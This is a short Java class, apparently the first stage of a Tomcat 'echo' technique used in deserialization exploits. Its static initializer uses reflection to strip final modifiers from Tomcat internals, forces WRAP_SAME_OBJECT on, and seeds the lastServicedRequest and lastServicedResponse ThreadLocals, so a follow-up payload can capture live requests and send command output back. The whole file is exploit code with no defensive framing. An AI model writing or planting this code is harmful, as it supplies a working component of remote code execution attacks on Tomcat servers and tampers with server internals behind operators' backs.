public class TomcatEcho {

    static {
        try {
            Class c = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
            java.lang.reflect.Field f = c.getDeclaredField("WRAP_SAME_OBJECT");
            java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            f.setAccessible(true);
            if (!f.getBoolean(null)) {
                f.setBoolean(null, true);
            }

            //初始化 lastServicedRequest
            c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            f = c.getDeclaredField("lastServicedRequest");
            modifiersField = f.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            f.setAccessible(true);
            if (f.get(null) == null) {
                f.set(null, new ThreadLocal());
            }

            f = c.getDeclaredField("lastServicedResponse");
            modifiersField = f.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            f.setAccessible(true);
            if (f.get(null) == null) {
                f.set(null, new ThreadLocal());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}